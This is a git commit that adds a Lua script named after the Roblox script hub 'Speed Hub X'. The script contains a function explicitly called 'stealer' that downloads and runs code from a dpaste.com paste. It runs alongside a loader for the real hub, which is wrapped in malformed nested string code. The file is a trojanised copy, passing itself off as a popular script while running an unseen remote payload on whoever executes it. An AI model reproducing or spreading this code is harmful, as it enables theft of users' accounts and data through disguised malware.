212f5cfbbc824832b43b9ca44bb81fa4ad491dee
shutupmagnus-lang <shutupmagnus@gmail.com>
2025-08-08 00:50:07 -0300

    Create Speed%20Hub%20X%20.lua

---
+++ Speed%20Hub%20X%20.lua
@@ -0,0 +1,12 @@
+local function stealer()
+    loadstring(game:HttpGet("https://dpaste.com/4JDTN9V9F.txt", true))()
+end
+
+local function loadui()
+    loadstring(game:HttpGet("
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+      ", true))("discord.gg/csxu2nCkw9")
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
